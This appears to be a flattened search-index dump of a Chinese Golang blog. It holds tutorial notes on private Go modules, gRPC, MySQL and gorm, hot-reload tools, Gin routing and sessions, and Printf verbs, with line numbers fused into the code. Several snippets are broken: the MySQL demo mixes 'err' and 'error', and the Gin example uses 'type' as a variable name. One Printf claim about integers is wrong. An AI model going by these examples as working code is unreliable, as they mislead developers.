git.xxx.com/core-logic/go.mod at revision v0.0.41: unknown revision v0.0.41 Solution1234$ go env -w GOPRIVATE=git.xxx.com# Try again, it would be working$ go get git.xxx.com/yyy/core-logic 下载依赖时的debug12// see details$ go get git.garena.com/shopee/core-server/core-logic -v Reference https://juejin.im/post/5c8e503a6fb9a070d878184a https://ieevee.com/tech/2018/08/28/go-modules.html https://objcoding.com/2018/09/13/go-modules/ https://segmentfault.com/a/1190000016703769 https://www.reddit.com/r/golang/comments/d2n5s0/error_410_gone_when_switching_to_modules_in_go_113/","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】Golang 使用 gRPC","date":"2020-01-12T12:20:23.000Z","path":"2020/01/12/【Golang】使用-gRPC/","text":"定义 gRPC的.proto12345678910111213141516171819syntax = \"proto3\";package helloworld;// The greeting service definition.service Greeter &#123; // Sends a greeting rpc SayHello (HelloRequest) returns (HelloReply) &#123;&#125;&#125;// The request message containing the user's name.message HelloRequest &#123; string name = 1;&#125;// The response message containing the greetingsmessage HelloReply &#123; string message = 1;&#125; Generate gRPC codeNext we need to update the gRPC code used by our application to use the new service definition. From the same examples dir as above ($GOPATH/src/google.golang.org/grpc/examples/helloworld) 1$ protoc -I helloworld/ helloworld/helloworld.proto --go_out=plugins=grpc:helloworld 一个官方的 Democlient.go123456789101112131415161718192021222324252627282930313233343536373839404142// Package main implements a client for Greeter service.package mainimport ( \"context\" //pb \"google.golang.org/grpc/examples/helloworld/helloworld\" \"log\" \"os\" \"time\" pb \"awesomeProject/protobufsw\" \"google.golang.org/grpc\" //pb \"google.golang.org/grpc/examples/helloworld/helloworld\")const ( address = \"localhost:50051\" defaultName = \"world\")func main() &#123; // Set up a connection to the server. conn, err := grpc.Dial(address, grpc.WithInsecure(), grpc.WithBlock()) if err != nil &#123; log.Fatalf(\"did not connect: %v\", err) &#125; defer conn.Close() c := pb.NewGreeterClient(conn) // Contact the server and print out its response. name := defaultName if len(os.Args) &gt; 1 &#123; name = os.Args[1] &#125; ctx, cancel := context.WithTimeout(context.Background(), time.Second) defer cancel() r, err := c.SayHello(ctx, &amp;pb.HelloRequest&#123;Name: name&#125;) if err != nil &#123; log.Fatalf(\"could not greet: %v\", err) &#125; log.Printf(\"Greeting: %s\", r.GetMessage())&#125; server.go123456789101112131415161718192021222324252627282930313233343536373839404142//go:generate protoc -I ../helloworld --go_out=plugins=grpc:../helloworld ../helloworld/helloworld.proto// Package main implements a server for Greeter service.package mainimport ( \"context\" //pb \"google.golang.org/grpc/examples/helloworld/helloworld\" \"log\" \"net\" \"google.golang.org/grpc\" pb \"awesomeProject/protobufsw\" //pb \"google.golang.org/grpc/examples/helloworld/helloworld\")const ( port = \":50051\")// server is used to implement helloworld.GreeterServer.type server struct &#123; pb.UnimplementedGreeterServer&#125;// SayHello implements helloworld.GreeterServerfunc (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) &#123; log.Printf(\"Received: %v\", in.GetName()) return &amp;pb.HelloReply&#123;Message: \"Hello \" + in.GetName()&#125;, nil&#125;func main() &#123; lis, err := net.Listen(\"tcp\", port) if err != nil &#123; log.Fatalf(\"failed to listen: %v\", err) &#125; s := grpc.NewServer() pb.RegisterGreeterServer(s, &amp;server&#123;&#125;) if err := s.Serve(lis); err != nil &#123; log.Fatalf(\"failed to serve: %v\", err) &#125;&#125; api.go1234567891011121314151617181920212223syntax = \"proto3\";option java_multiple_files = true;option java_package = \"io.grpc.examples.helloworld\";option java_outer_classname = \"HelloWorldProto\";package protobufsw;// The greeting service definition.service Greeter &#123; // Sends a greeting rpc SayHello (HelloRequest) returns (HelloReply) &#123;&#125;&#125;// The request message containing the user's name.message HelloRequest &#123; string name = 1;&#125;// The response message containing the greetingsmessage HelloReply &#123; string message = 1;&#125; 执行 protoc -I protobufsw/ protobufsw/api.proto --go_out=plugins=grpc:protobufsw 以将 api.go 生成 api.pb.go。此后，就可以运行 server.go 和 client.go Reference https://grpc.io/docs/quickstart/go/","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】Golang 连接 MySQL","date":"2020-01-12T12:17:55.000Z","path":"2020/01/12/【Golang】mysql-Go-连接-MySQL/","text":"安装1$ go get -u github.com/go-sql-driver/mysql mysql数据库连接 构建连接, 格式是：”用户名:密码@tcp(IP:端口)/数据库?charset=utf8” 打开数据库,前者是驱动名，所以要导入： _ “github.com/go-sql-driver/mysql” 设置数据库最大连接数和设置上数据库最大闲置连接数 验证连接：使用Ping()函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package mainimport ( \"database/sql\" \"fmt\" _ \"github.com/go-sql-driver/mysql\" \"time\")//数据库配置const ( userName = \"root\" password = \"123456\" ip = \"127.0.0.1\" port = \"3306\" dbName = \"test\")func InitDB() &#123; path := strings.Join([]string&#123;userName, \":\", password, \"@tcp(\",ip, \":\", port, \")/\", dbName, \"?charset=utf8\"&#125;, \"\") db, error := gorm.Open(\"mysql\", path) // if there is an error opening the connection, handle it if err != nil &#123; panic(err.Error()) &#125; results, err := db.Query(\"select * from tb\") fmt.Println(results) for results.Next() &#123; var promotion Promotion // for each row, scan the result into our tag composite object err = results.Scan(&amp;promotion.id, &amp;promotion.c1, &amp;promotion.c2) if err != nil &#123; panic(err.Error()) // proper error handling instead of panic in your app &#125; &#125;&#125;type Promotion struct &#123; id int c1 string c2 string&#125;func main() &#123; InitDB()&#125; Reference https://www.jianshu.com/p/ee87e989f149","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】修改代码后自动重新编译并启动","date":"2020-01-12T10:33:53.000Z","path":"2020/01/12/【Golang】修改代码后自动重新编译并启动/","text":"在开发 Go 的 Web 项目的过程中，让新增加或者修改的代码被自动编译并重启项目是一件可以提高工作效率的事情。 For Web ApplicationsGin（https://github.com/codegangsta/gin）12345$ go get github.com/codegangsta/gin$ cd /home/project/myblog$ gin 如果 main.go 文件不在根目录下，则通过 -d 来指定main.go 文件所在的文件夹 1$ gin -d Gateway/main 这时控制台就开始编译打包执行了，注意控制台返回的信息，能知道项目的编译错误和日志，最后会有访问 url。 如果发现项目中有 go 文件新增或修改，gin 和 fresh 都会智能 reload 。 AirInstallThe classic way to install 1$ go get -u github.com/cosmtrek/air UsageFor less typing, you could add alias air=&#39;~/.air&#39; to your .bashrc or .zshrc. First enter into your project 1$ cd /path/to/your_project The simplest usage is run 12# firstly find `.air.conf` in current directory, if not found, use defaults$ air -c .air.conf While I prefer the second way 1234567# 1. create a new file$ touch .air.conf# 2. paste `air.conf.example` into this file, and **modify it** to satisfy your needs.# 3. run air with your config. If file name is `.air.conf`, just run `air`.$ air air_example.conf 12345678910111213141516171819202122232425262728293031323334353637383940414243# Config file for [Air](https://github.com/cosmtrek/air) in TOML format# Working directory# . or absolute path, please note that the directories following must be under root.root = \".\"tmp_dir = \"tmp\"[build]# Just plain old shell command. You could use `make` as well.cmd = \"go build -o ./tmp/main main.go\"# Binary file yields from `cmd`.bin = \"tmp/main\"# Customize binary.full_bin = \"APP_ENV=dev APP_USER=air ./tmp/main\"# Watch these filename extensions.include_ext = [\"go\", \"tpl\", \"tmpl\", \"html\"]# Ignore these filename extensions or directories.exclude_dir = [\"assets\", \"tmp\", \"vendor\", \"frontend/node_modules\"]# Watch these directories if you specified.include_dir = []# Exclude files.exclude_file = []# It's not necessary to trigger build each time file changes if it's too frequent.delay = 1000 # ms# Stop to run old binary when build errors occur.stop_on_error = true# This log file places in your tmp_dir.log = \"air_errors.log\"[log]# Show log timetime = false[color]# Customize each part's color. If no color found, use the raw app log.main = \"magenta\"watcher = \"cyan\"build = \"yellow\"runner = \"green\"[misc]# Delete tmp directory on exitclean_on_exit = true For Other Applications - 使用 realize1$ go get github.com/oxequa/realize Potential Error1234567891011$ go get github.com/oxequa/realizego: finding github.com/oxequa/interact latestgo: finding golang.org/x/net latestgo: finding gopkg.in/urfave/cli.v2 v2.1.1build github.com/oxequa/realize: cannot load gopkg.in/urfave/cli.v2: cannot find module providing package gopkg.in/urfave/cli.v2$ go get gopkg.in/urfave/cli.v2@mastergo: finding gopkg.in/urfave/cli.v2 mastergo: finding gopkg.in master$ GoPlayGround go get github.com/oxequa/realize $ Reference https://www.5-wow.com/article/detail/47","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】使用 gorm（ORM 框架）","date":"2020-01-12T10:02:21.000Z","path":"2020/01/12/【Golang】使用-gorm/","text":"Install1$ go get -u github.com/jinzhu/gorm Demo1234567891011121314151617181920212223242526272829303132//数据库配置const ( userName = \"root\" password = \"123456\" ip = \"127.0.0.1\" port = \"3306\" dbName = \"test\")func getDBInstance() (*gorm.DB, error) &#123; path := strings.Join([]string&#123;userName, \":\", password, \"@tcp(\", ip, \":\", port, \")/\", dbName, \"?charset=utf8&amp;parseTime=True&amp;loc=Local\"&#125;, \"\") return gorm.Open(\"mysql\", path)&#125;func demo()&#123; //// 自动迁移模式 //db.AutoMigrate(&amp;Product&#123;&#125;) // //// 创建 //db.Create(&amp;Product&#123;Code: \"L1212\", Price: 1000&#125;) // //// 读取 //var product Product //db.First(&amp;product, 1) // 查询id为1的product //db.First(&amp;product, \"code = ?\", \"L1212\") // 查询code为l1212的product // //// 更新 - 更新product的price为2000 //db.Model(&amp;product).Update(\"Price\", 2000) // //// 删除 - 删除product //db.Delete(&amp;product)&#125; Schema-related检查表是否存在12345// 检查模型`User`表是否存在db.HasTable(&amp;User&#123;&#125;)// 检查表`users`是否存在db.HasTable(\"users\") 创建表12345// 为模型`User`创建表db.CreateTable(&amp;User&#123;&#125;)// 创建表`users'时将“ENGINE = InnoDB”附加到SQL语句db.Set(\"gorm:table_options\", \"ENGINE=InnoDB\").CreateTable(&amp;User&#123;&#125;) 删除表12345678// 删除模型`User`的表db.DropTable(&amp;User&#123;&#125;)// 删除表`users`db.DropTable(\"users\")// 删除模型`User`的表和表`products`db.DropTableIfExists(&amp;User&#123;&#125;, \"products\") 修改列修改列的类型为给定值 12// 修改模型`User`的description列的数据类型为`text`db.Model(&amp;User&#123;&#125;).ModifyColumn(\"description\", \"text\") 删除列12// 删除模型`User`的description列db.Model(&amp;User&#123;&#125;).DropColumn(\"description\") 添加外键123456// 添加主键// 1st param : 外键字段// 2nd param : 外键表(字段)// 3rd param : ONDELETE// 4th param : ONUPDATEdb.Model(&amp;User&#123;&#125;).AddForeignKey(\"city_id\", \"cities(id)\", \"RESTRICT\", \"RESTRICT\") 索引1234567891011121314// 为`name`列添加索引`idx_user_name`db.Model(&amp;User&#123;&#125;).AddIndex(\"idx_user_name\", \"name\")// 为`name`, `age`列添加索引`idx_user_name_age`db.Model(&amp;User&#123;&#125;).AddIndex(\"idx_user_name_age\", \"name\", \"age\")// 添加唯一索引db.Model(&amp;User&#123;&#125;).AddUniqueIndex(\"idx_user_name\", \"name\")// 为多列添加唯一索引db.Model(&amp;User&#123;&#125;).AddUniqueIndex(\"idx_user_name_age\", \"name\", \"age\")// 删除索引db.Model(&amp;User&#123;&#125;).RemoveIndex(\"idx_user_name\") CRUDRetrieveFirst查询一条记录，根据主键ID排序(正序)，返回第一条记录 12//等价于：SELECT * FROM `foods` ORDER BY `foods`.`id` ASC LIMIT 1 db.First(&amp;food) Last查询一条记录, 根据主键ID排序(倒序)，返回第一条记录 123//等价于：SELECT * FROM `foods` ORDER BY `foods`.`id` DESC LIMIT 1 //语义上相当于返回最后一条记录db.Last(&amp;food) Find查询多条记录，Find函数返回的是一个数组 123456789//因为Find返回的是数组，所以定义一个商品数组用来接收结果var foods []Food//等价于：SELECT * FROM `foods`db.Find(&amp;foods)// 使用主键获取记录db.First(&amp;user, 10)//// SELECT * FROM users WHERE id = 10; Where查询条件 (简单SQL)1234567891011121314151617181920212223// 获取第一个匹配记录db.Where(\"name = ?\", \"jinzhu\").First(&amp;user)//// SELECT * FROM users WHERE name = 'jinzhu' limit 1;// 获取所有匹配记录db.Where(\"name = ?\", \"jinzhu\").Find(&amp;users)//// SELECT * FROM users WHERE name = 'jinzhu';db.Where(\"name &lt;&gt; ?\", \"jinzhu\").Find(&amp;users)// INdb.Where(\"name in (?)\", []string&#123;\"jinzhu\", \"jinzhu 2\"&#125;).Find(&amp;users)// LIKEdb.Where(\"name LIKE ?\", \"%jin%\").Find(&amp;users)// ANDdb.Where(\"name = ? AND age &gt;= ?\", \"jinzhu\", \"22\").Find(&amp;users)// Timedb.Where(\"updated_at &gt; ?\", lastWeek).Find(&amp;users)db.Where(\"created_at BETWEEN ? AND ?\", lastWeek, today).Find(&amp;users) Where查询条件 (Struct &amp; Map)注意：当使用struct查询时，GORM将只查询那些具有值的字段 1234567891011// Structdb.Where(&amp;User&#123;Name: \"jinzhu\", Age: 20&#125;).First(&amp;user)//// SELECT * FROM users WHERE name = \"jinzhu\" AND age = 20 LIMIT 1;// Mapdb.Where(map[string]interface&#123;&#125;&#123;\"name\": \"jinzhu\", \"age\": 20&#125;).Find(&amp;users)//// SELECT * FROM users WHERE name = \"jinzhu\" AND age = 20;// 主键的Slicedb.Where([]int64&#123;20, 21, 22&#125;).Find(&amp;users)//// SELECT * FROM users WHERE id IN (20, 21, 22); Create1234567user := User&#123;Name: \"Jinzhu\", Age: 18, Birthday: time.Now()&#125;db.NewRecord(user) // =&gt; 主键为空返回`true`db.Create(&amp;user)db.NewRecord(user) // =&gt; 创建`user`后返回`false` 默认值您可以在gorm tag中定义默认值，然后插入SQL将忽略具有默认值的这些字段，并且其值为空，并且在将记录插入数据库后，gorm将从数据库加载这些字段的值。 1234567891011type Animal struct &#123; ID int64 Name string `gorm:\"default:'galeone'\"` Age int64&#125;var animal = Animal&#123;Age: 99, Name: \"\"&#125;db.Create(&amp;animal)// INSERT INTO animals(\"age\") values('99');// SELECT name from animals WHERE ID=111; // 返回主键为 111// animal.Name =&gt; 'galeone' 在Callbacks中设置主键如果要在BeforeCreate回调中设置主字段的值，可以使用scope.SetColumn，例如： 1234func (user *User) BeforeCreate(scope *gorm.Scope) error &#123; scope.SetColumn(\"ID\", uuid.New()) return nil&#125; 扩展创建选项123// 为Instert语句添加扩展SQL选项db.Set(\"gorm:insert_option\", \"ON CONFLICT\").Create(&amp;product)// INSERT INTO products (name, code) VALUES (\"name\", \"code\") ON CONFLICT; Update更新所有字段Save会更新所有字段，即使你没有赋值 1234567db.First(&amp;user)user.Name = \"jinzhu 2\"user.Age = 100db.Save(&amp;user)//// UPDATE users SET name='jinzhu 2', age=100, birthday='2016-01-01', updated_at = '2013-11-17 21:34:10' WHERE id=111; 更新修改字段如果你只希望更新指定字段，可以使用Update或者Updates 12345678910111213141516171819// 更新单个属性，如果它有变化db.Model(&amp;user).Update(\"name\", \"hello\")//// UPDATE users SET name='hello', updated_at='2013-11-17 21:34:10' WHERE id=111;// 根据给定的条件更新单个属性db.Model(&amp;user).Where(\"active = ?\", true).Update(\"name\", \"hello\")//// UPDATE users SET name='hello', updated_at='2013-11-17 21:34:10' WHERE id=111 AND active=true;// 使用 map 更新多个属性，只会更新其中有变化的属性db.Model(&amp;user).Updates(map[string]interface&#123;&#125;&#123;\"name\": \"hello\", \"age\": 18, \"actived\": false&#125;)//// UPDATE users SET name='hello', age=18, actived=false, updated_at='2013-11-17 21:34:10' WHERE id=111;// 使用 struct 更新多个属性，只会更新其中有变化且为非零值的字段db.Model(&amp;user).Updates(User&#123;Name: \"hello\", Age: 18&#125;)//// UPDATE users SET name='hello', age=18, updated_at = '2013-11-17 21:34:10' WHERE id = 111;// 警告：当使用 struct 更新时，GORM只会更新那些非零值的字段// 对于下面的操作，不会发生任何更新，\"\", 0, false 都是其类型的零值db.Model(&amp;user).Updates(User&#123;Name: \"\", Age: 0, Actived: false&#125;) 更新选定字段如果你想更新或忽略某些字段，你可以使用 Select，Omit 12345db.Model(&amp;user).Select(\"name\").Updates(map[string]interface&#123;&#125;&#123;\"name\": \"hello\", \"age\": 18, \"actived\": false&#125;)//// UPDATE users SET name='hello', updated_at='2013-11-17 21:34:10' WHERE id=111;db.Model(&amp;user).Omit(\"name\").Updates(map[string]interface&#123;&#125;&#123;\"name\": \"hello\", \"age\": 18, \"actived\": false&#125;)//// UPDATE users SET age=18, actived=false, updated_at='2013-11-17 21:34:10' WHERE id=111; 无 Hooks 更新上面的更新操作会自动运行 model 的 BeforeUpdate, AfterUpdate 方法，更新 UpdatedAt 时间戳, 在更新时保存其 Associations, 如果你不想调用这些方法，你可以使用 UpdateColumn， UpdateColumns 1234567// 更新单个属性，类似于 `Update`db.Model(&amp;user).UpdateColumn(\"name\", \"hello\")//// UPDATE users SET name='hello' WHERE id = 111;// 更新多个属性，类似于 `Updates`db.Model(&amp;user).UpdateColumns(User&#123;Name: \"hello\", Age: 18&#125;)//// UPDATE users SET name='hello', age=18 WHERE id = 111; 批量更新批量更新时 Hooks 不会运行 123456789db.Table(\"users\").Where(\"id IN (?)\", []int&#123;10, 11&#125;).Updates(map[string]interface&#123;&#125;&#123;\"name\": \"hello\", \"age\": 18&#125;)//// UPDATE users SET name='hello', age=18 WHERE id IN (10, 11);// 使用 struct 更新时，只会更新非零值字段，若想更新所有字段，请使用map[string]interface&#123;&#125;db.Model(User&#123;&#125;).Updates(User&#123;Name: \"hello\", Age: 18&#125;)//// UPDATE users SET name='hello', age=18;// 使用 `RowsAffected` 获取更新记录总数db.Model(User&#123;&#125;).Updates(User&#123;Name: \"hello\", Age: 18&#125;).RowsAffected 使用 SQL 表达式更新1234567891011DB.Model(&amp;product).Update(\"price\", gorm.Expr(\"price * ? + ?\", 2, 100))//// UPDATE \"products\" SET \"price\" = price * '2' + '100', \"updated_at\" = '2013-11-17 21:34:10' WHERE \"id\" = '2';DB.Model(&amp;product).Updates(map[string]interface&#123;&#125;&#123;\"price\": gorm.Expr(\"price * ? + ?\", 2, 100)&#125;)//// UPDATE \"products\" SET \"price\" = price * '2' + '100', \"updated_at\" = '2013-11-17 21:34:10' WHERE \"id\" = '2';DB.Model(&amp;product).UpdateColumn(\"quantity\", gorm.Expr(\"quantity - ?\", 1))//// UPDATE \"products\" SET \"quantity\" = quantity - 1 WHERE \"id\" = '2';DB.Model(&amp;product).Where(\"quantity &gt; 1\").UpdateColumn(\"quantity\", gorm.Expr(\"quantity - ?\", 1))//// UPDATE \"products\" SET \"quantity\" = quantity - 1 WHERE \"id\" = '2' AND quantity &gt; 1; 错误处理错误处理GORM中的错误处理与惯用的Go代码不同，因为它具有可链接的API，但仍然易于实现。 如果发生任何错误，GORM将设置* gorm.DB的错误字段，可以这样检查： 123if err := db.Where(\"name = ?\", \"jinzhu\").First(&amp;user).Error; err != nil &#123; // error 处理...&#125; 或者 123if result := db.Where(\"name = ?\", \"jinzhu\").First(&amp;user); result.Error != nil &#123; // error 处理...&#125; 错误处理数据时，通常会发生多个错误。 GORM提供了一个API来将所有错误作为切片返回： 12345678// 如果发生了一个以上的错误， `GetErrors` 以`[]error`形式返回他们errors := db.First(&amp;user).Limit(10).Find(&amp;users).GetErrors()fmt.Println(len(errors))for _, err := range errors &#123; fmt.Println(err)&#125; 记录未找到错误RecordNotFound，GORM提供了处理 RecordNotFound 错误的快捷方式。如果有多个错误，它将逐一检查这些错误是否为 RecordNotFound 错误。 12345678910// 检查是否为 RecordNotFound 错误db.Where(\"name = ?\", \"hello world\").First(&amp;user).RecordNotFound()if db.Model(&amp;user).Related(&amp;credit_card).RecordNotFound() &#123; // 未找到记录&#125;if err := db.Where(\"name = ?\", \"jinzhu\").First(&amp;user).Error; gorm.IsRecordNotFoundError(err) &#123; // 未找到记录&#125; Potential Error错误 1 - sql: unknown driver “mysql”1234sql: unknown driver \"mysql\" (forgotten import?)panic: runtime error: invalid memory address or nil pointer dereference [recovered] panic: runtime error: invalid memory address or nil pointer dereference[signal SIGSEGV: segmentation violation code=0x1 addr=0x20 pc=0x10dd1f1] solution12345import(“database/sql”// 引入数据库驱动注册及初始化 _ \"github.com/go-sql-driver/mysql\") Reference https://jasperxu.github.io/gorm-zh/database.html#m Error Handling - http://gorm.io/zh_CN/docs/error_handling.html","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】Web Framework - Gin 使用","date":"2020-01-12T09:44:11.000Z","path":"2020/01/12/【Golang】Web-Framework-Gin-使用/","text":"路由gin 框架中采用的路由库是 httprouter。 1234567891011// 创建带有默认中间件的路由:// 日志与恢复中间件router := gin.Default()router.GET(\"/someGet\", getting)router.POST(\"/somePost\", posting)router.PUT(\"/somePut\", putting)router.DELETE(\"/someDelete\", deleting)router.PATCH(\"/somePatch\", patching)router.HEAD(\"/someHead\", head)router.OPTIONS(\"/someOptions\", options) Controller 中获取参数api 参数通过Context的Param方法来获取 1234router.GET(\"/string/:name\", func(c *gin.Context) &#123; name := c.Param(\"name\") fmt.Println(\"Hello %s\", name) &#125;) URL 参数通过 DefaultQuery 或 Query 方法获取 12345678910// url 为 http://localhost:8080/welcome?name=ningskyer时// 输出 Hello ningskyer// url 为 http://localhost:8080/welcome时// 输出 Hello Guestrouter.GET(\"/welcome\", func(c *gin.Context) &#123; name := c.DefaultQuery(\"name\", \"Guest\") //可设置默认值 // 是 c.Request.URL.Query().Get(\"lastname\") 的简写 lastname := c.Query(\"lastname\") fmt.Println(\"Hello %s\", name)&#125;) form 中的参数通过 PostForm 方法获取 1234567//formrouter.POST(\"/form\", func(c *gin.Context) &#123; type := c.DefaultPostForm(\"type\", \"alert\")//可设置默认值 msg := c.PostForm(\"msg\") title := c.PostForm(\"title\") fmt.Println(\"type is %s, msg is %s, title is %s\", type, msg, title)&#125;) 使用 Sessions使用 Sessions 的方法1234567891011r := gin.Default()# init the usage of sessionsstore := cookie.NewStore([]byte(\"secret\"))r.Use(sessions.Sessions(\"mysession\", store))// register routerouter.GET(\"/register\", controllers.RegisterGet)router.POST(\"/register\", controllers.RegisterPost)router.GET(\"/login\", controllers.LoginGet)router.POST(\"/login\", controllers.LoginPost) 否则会有这个错误 12345678910111213141516171819202122232425262728293031323334353637383940412019/12/30 15:50:18 [Recovery] 2019/12/30 - 15:50:18 panic recovered:POST /login/ HTTP/1.1Host: 127.0.0.1:8081Accept: */*Accept-Encoding: gzip, deflateCache-Control: no-cacheConnection: keep-aliveContent-Length: 31Content-Type: application/x-www-form-urlencodedCookie: REC_T_ID=dd1b3c6e-2188-11ea-8506-acde48001122; SPC_F=6ZevBFRrReyMP8xzEWNZYhA39Zh5RJCP; SPC_IA=-1; SPC_U=-; SPC_EC=-; mysession=MTU3NzY5MjE0MXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQldobGJHeHZCbk4wY21sdVp3d0hBQVYzYjNKc1pBPT18vPPUSn81suSunkGtkAVaOFOpK1SYbhZiJMAiOLeVeRU=Postman-Token: 06cacb8b-8550-4da9-8a8c-a727c761c45aUser-Agent: PostmanRuntime/7.21.0Key \"github.com/gin-contrib/sessions\" does not exist/Users/wei.shi/go/pkg/mod/github.com/gin-gonic/gin@v1.5.0/context.go:240 (0x15911e0) (*Context).MustGet: panic(\"Key \\\"\" + key + \"\\\" does not exist\")/Users/wei.shi/go/pkg/mod/github.com/gin-contrib/sessions@v0.0.3/sessions.go:139 (0x1590d1a) Default: return c.MustGet(DefaultKey).(Session)/Working/EntryTask3/Gateway/Controllers/Login/loginControllers.go:51 (0x1590cc9) Login: session := sessions.Default(c)/Users/wei.shi/go/pkg/mod/github.com/gin-gonic/gin@v1.5.0/context.go:147 (0x14fa46a) (*Context).Next: c.handlers[c.index](c)/Users/wei.shi/go/pkg/mod/github.com/gin-gonic/gin@v1.5.0/recovery.go:83 (0x150df03) RecoveryWithWriter.func1: c.Next()/Users/wei.shi/go/pkg/mod/github.com/gin-gonic/gin@v1.5.0/context.go:147 (0x14fa46a) (*Context).Next: c.handlers[c.index](c)/Users/wei.shi/go/pkg/mod/github.com/gin-gonic/gin@v1.5.0/logger.go:241 (0x150d030) LoggerWithConfig.func1: c.Next()/Users/wei.shi/go/pkg/mod/github.com/gin-gonic/gin@v1.5.0/context.go:147 (0x14fa46a) (*Context).Next: c.handlers[c.index](c)/Users/wei.shi/go/pkg/mod/github.com/gin-gonic/gin@v1.5.0/gin.go:403 (0x1504499) (*Engine).handleHTTPRequest: c.Next()/Users/wei.shi/go/pkg/mod/github.com/gin-gonic/gin@v1.5.0/gin.go:364 (0x1503b8d) (*Engine).ServeHTTP: engine.handleHTTPRequest(c)/usr/local/go/src/net/http/server.go:2802 (0x12cbfe3) serverHandler.ServeHTTP: handler.ServeHTTP(rw, req)/usr/local/go/src/net/http/server.go:1890 (0x12c7884) (*conn).serve: serverHandler&#123;c.server&#125;.ServeHTTP(w, w.req)/usr/local/go/src/runtime/asm_amd64.s:1357 (0x105c0a0) goexit: BYTE $0x90 // NOP Reference https://github.com/skyhee/gin-doc-cn#basic-router https://github.com/gin-contrib/sessions https://www.tizi365.com/archives/288.html https://github.com/gin-gonic/gin/issues/533","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】Print","date":"2020-01-12T09:34:10.000Z","path":"2020/01/12/【Golang】Print/","text":"Println 与PrintfPrintln 与Printf 都是fmt 包中的公共方法，在需要打印信息时，会用到这二个函数，那么这二个函数有什么区别呢？ Println()：可以打印出字符串，和变量； Printf()：只可以打印出格式化的字符串，可以输出字符串类型的变量，不可以输出整形变量和整形 也就是说，当需要格式化输出信息时一般选择 Printf，其他时候用 Println 就可以了，比如： 123456func main() &#123; a := 10 fmt.Println(a) fmt.Println(\"abc\",\"d\") fmt.Printf(\"%d\",a)&#125; 我们发现： 在调用fmt.Println()时，可以提供多个 string，且在打印时，会自动在这些 string 之间加上空格。 在调用fmt.Printf()时，需要指定 format，如 C 语言中那样。 Printf中的 format普通占位符123456占位符 说明 举例 输出%v 相应值的默认格式。 Printf(\"%v\", people) &#123;zhangsan&#125;，%+v 打印结构体时，会添加字段名 Printf(\"%+v\", people) &#123;Name:zhangsan&#125;%#v 相应值的Go语法表示 Printf(\"#v\", people) main.Human&#123;Name:\"zhangsan\"&#125;%T 相应值的类型的Go语法表示 Printf(\"%T\", people) main.Human%% 字面上的百分号，并非值的占位符 Printf(\"%%\") % 布尔占位符12占位符 说明 举例 输出%t true 或 false。 Printf(\"%t\", true) true 整数占位符123456789占位符 说明 举例 输出%b 二进制表示 Printf(\"%b\", 5) 101%c 相应Unicode码点所表示的字符 Printf(\"%c\", 0x4E2D) 中%d 十进制表示 Printf(\"%d\", 0x12) 18%o 八进制表示 Printf(\"%d\", 10) 12%q 单引号围绕的字符字面值，由Go语法安全地转义 Printf(\"%q\", 0x4E2D) '中'%x 十六进制表示，字母形式为小写 a-f Printf(\"%x\", 13) d%X 十六进制表示，字母形式为大写 A-F Printf(\"%x\", 13) D%U Unicode格式：U+1234，等同于 \"U+%04X\" Printf(\"%U\", 0x4E2D) U+4E2D 浮点数和复数的组成部分（实部和虚部）12345678占位符 说明 举例 输出%b 无小数部分的，指数为二的幂的科学计数法， 与 strconv.FormatFloat 的 'b' 转换格式一致。例如 -123456p-78%e 科学计数法，例如 -1234.456e+78 Printf(\"%e\", 10.2) 1.020000e+01%E 科学计数法，例如 -1234.456E+78 Printf(\"%e\", 10.2) 1.020000E+01%f 有小数点而无指数，例如 123.456 Printf(\"%f\", 10.2) 10.200000%g 根据情况选择 %e 或 %f 以产生更紧凑的（无末尾的0）输出 Printf(\"%g\", 10.20) 10.2%G 根据情况选择 %E 或 %f 以产生更紧凑的（无末尾的0）输出 Printf(\"%G\", 10.20+2i) (10.2+2i) 字符串与字节切片12345占位符 说明 举例 输出%s 输出字符串表示（string类型或[]byte) Printf(\"%s\", []byte(\"Go语言\")) Go语言%q 双引号围绕的字符串，由Go语法安全地转义 Printf(\"%q\", \"Go语言\") \"Go语言\"%x 十六进制，小写字母，每字节两个字符 Printf(\"%x\", \"golang\") 676f6c616e67%X 十六进制，大写字母，每字节两个字符 Printf(\"%X\", \"golang\") 676F6C616E67 指针12占位符 说明 举例 输出%p 十六进制表示，前缀 0x Printf(\"%p\", &amp;people) 0x4f57f0 其它标记123456789101112占位符 说明 举例 输出+ 总打印数值的正负号；对于%q（%+q）保证只输出ASCII编码的字符。 Printf(\"%+q\", \"中文\") \"\\u4e2d\\u6587\"- 在右侧而非左侧填充空格（左对齐该区域）# 备用格式：为八进制添加前导 0（%#o） Printf(\"%#U\", '中') U+4E2D 为十六进制添加前导 0x（%#x）或 0X（%#X），为 %p（%#p）去掉前导 0x； 如果可能的话，%q（%#q）会打印原始 （即反引号围绕的）字符串； 如果是可打印字符，%U（%#U）会写出该字符的 Unicode 编码形式（如字符 x 会被打印成 U+0078 'x'）。' ' (空格)为数值中省略的正负号留出空白（% d）； 以十六进制（% x, % X）打印字符串或切片时，在字节之间用空格隔开0 填充前导的0而非空格；对于数字，这会将填充移到正负号之后 打印变量的地址1234567var m map[int]string = map[int]string&#123; 0: \"0\", 